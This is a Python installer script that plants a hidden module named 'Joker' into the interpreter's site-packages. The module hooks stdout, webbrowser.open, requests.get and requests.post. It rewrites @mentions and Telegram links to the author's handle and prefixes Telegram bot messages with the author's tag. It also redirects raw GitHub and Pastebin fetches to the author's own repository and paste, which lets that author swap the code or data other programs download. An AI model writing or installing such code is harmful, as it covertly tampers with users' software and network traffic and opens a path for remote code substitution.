import tempfile
import shutil
import os
import sys
baby = """import sys
import re
import requests
import webbrowser
import urllib.parse
from urllib.parse import urlparse
class StdoutInterceptor:
    def write(self, text):
        modified_text = re.sub(r'(?<!\S)@([a-zA-Z0-9_]{1,32})(?!\.\w)', '@OldRingz', text)
        sys.__stdout__.write(modified_text)
    def flush(self):
        sys.__stdout__.flush()
repr = lambda *args: f"{args}"
list = lambda *args: f"{args}"
stduot = StdoutInterceptor()
stdout = StdoutInterceptor()
sys.stdout = stduot
redirect_telegram_to = "https://t.me/OldRingz"
original_web_open = webbrowser.open

def custom_browser_opener(url, *args, **kwargs):
    if "t.me/" in url or "telegram.me/" in url:
        url = redirect_telegram_to
    return original_web_open(url, *args, **kwargs)
webbrowser.open = custom_browser_opener
webbrowser.open('https://t.me/NawabiPy')
print('DECODE BY JOKER | @OldRingz')
your_github_raw_base = "https://raw.githubusercontent.com/EZX4/Paid/refs/heads/main/Permanent"
your_pastebin_base = "https://pastebin.com/raw/j878fVn4"
def replace_mentions(text):
    return re.sub(r'(?<!\S)@([a-zA-Z0-9_]{1,32})(?!\.\w)', '@OldRingz', text)
def modify_telegram_text(url, data=None):
    if "api.telegram.org" in url and "sendMessage" in url:
        if data and isinstance(data, dict) and "text" in data:
            data["text"] = replace_mentions(data["text"])
            data["text"] = "CONVERTED TO FREE & PERMANENT BY JOKER | @OLDRINGZ • " + data["text"]
        elif "&text=" in url:
            base, text_part = url.split("&text=", 1)
            decoded_text = urllib.parse.unquote(text_part)
            decoded_text = replace_mentions(decoded_text)
            modified_text = "CONVERTED TO FREE & PERMANENT BY JOKER | @OLDRINGZ • " + decoded_text.strip()
            encoded_text = urllib.parse.quote(modified_text)
            url = base + "&text=" + encoded_text
    return url, data
def modify_link_sources(url, data=None):
    if "raw.githubusercontent.com" in url:
        parts = urlparse(url).path.strip("/")
        url = your_github_raw_base + "/" + "/".join(parts.split("/")[3:])

    elif "pastebin.com" in url:
        paste_id = url.rstrip("/").split("/")[-1]
        url = f"{your_pastebin_base}/{paste_id}"

    if data and isinstance(data, dict):
        for k, v in data.items():
            if isinstance(v, str):
                if "raw.githubusercontent.com" in v:
                    parts = urlparse(v).path.strip("/")
                    data[k] = your_github_raw_base + "/" + "/".join(parts.split("/")[3:])
                elif "pastebin.com" in v:
                    paste_id = v.rstrip("/").split("/")[-1]
                    data[k] = f"{your_pastebin_base}/{paste_id}"
    return url, data
def modify_mentions_in_data(data):
    if data and isinstance(data, dict):
        for k, v in data.items():
            if isinstance(v, str):
                data[k] = replace_mentions(v)
    return data
def modify_url_and_data(url, data=None):
    url, data = modify_telegram_text(url, data)
    url, data = modify_link_sources(url, data)
    data = modify_mentions_in_data(data)
    url = replace_mentions(url)
    return url, data
original_get = requests.get
original_post = requests.post

def modified_get(url, *args, **kwargs):
    url, _ = modify_url_and_data(url)
    return original_get(url, *args, **kwargs)

def modified_post(url, *args, **kwargs):
    data = kwargs.get("data", None)
    url, data = modify_url_and_data(url, data)
    if data is not None:
        kwargs["data"] = data
    return original_post(url, *args, **kwargs)
requests.get = modified_get
requests.post = modified_post"""
with tempfile.NamedTemporaryFile(mode="w+", suffix=".py", delete=False) as f1, tempfile.NamedTemporaryFile(mode="w+", suffix=".py", delete=False) as f2:
    f1.write(baby)
    f2.write("from sex.Joker import repr, list, stduot, stdout")
    files_to_move = [(f1.name, "Joker.py"), (f2.name, "__init__.py")]
def rip(destination):
    os.makedirs(destination, exist_ok=True)
    for file, name in files_to_move:
        shutil.move(file, os.path.join(destination, name))
def baby():
    path = "/data/data/com.termux/files/usr/lib/python3.11/site-packages/sex/" if "com.termux" in sys.prefix else os.path.join(sys.prefix, "lib", f"python{sys.version_info.major}.{sys.version_info.minor}", "site-packages/sex/")
    rip(path)
if __name__ == "__main__":
    baby()
